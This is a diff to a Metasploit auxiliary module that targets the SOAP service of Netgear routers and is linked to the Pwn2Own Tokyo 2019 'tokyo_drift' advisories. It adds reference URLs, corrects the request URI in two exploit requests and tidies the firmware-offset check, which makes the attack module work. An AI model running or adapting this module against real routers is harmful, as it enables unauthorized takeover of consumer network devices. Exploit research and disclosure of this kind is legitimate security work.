@@ -33,7 +33,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References'     =>
           [
-            [ 'URL', '<TODO>'],
+            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md'],
+            [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/tokyo_drift.md'],
             [ 'CVE', 'YYYY-XXXXX'],
             [ 'ZDI', '20-703'],
             [ 'ZDI', '20-704']
@@ -63,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     headers = "SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo"
 
     res = send_request_cgi({
-      'uri' => 'soap/server_sa HTTP/1.1',
+      'uri' => '/soap/server_sa',
       'method'  => 'POST',
       'raw_headers'  => headers,
       'data'  => soap
@@ -93,11 +94,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     offset = get_offset
     if not offset
-      fail_with(Failure::Unknown, "Unknown firmware version, can't proceed")
-    end
-
-    if not offset
-      fail_with(Failure::Unknown, 'Failed to obtain target version')
+      fail_with(Failure::Unknown, "Unknown firmware version, can't proceed, please contact the authors")
     end
 
     headers =
@@ -139,7 +136,7 @@ class MetasploitModule < Msf::Auxiliary
     headers += "\r\n"
 
     res = send_request_cgi({
-      'uri' => 'soap/server_sa HTTP/1.1',
+      'uri' => '/soap/server_sa',
       'method'  => 'POST',
       'raw_headers'  => headers,
       'data'  => payload
